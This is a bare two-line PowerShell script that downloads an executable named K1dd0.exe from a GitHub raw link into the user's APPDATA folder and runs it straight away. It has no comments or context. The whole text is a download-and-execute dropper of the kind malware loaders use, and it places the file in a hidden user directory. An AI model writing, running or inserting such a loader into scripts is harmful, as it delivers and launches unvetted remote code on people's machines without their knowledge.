(New-Object System.Net.WebClient).DownloadFile("https://github.com/justgonnaspace/k1dd0/blob/main/K1dd0.exe?raw=true","$env:APPDATA\k1dd0.exe")
Start-Process "$env:APPDATA\k1dd0.exe"
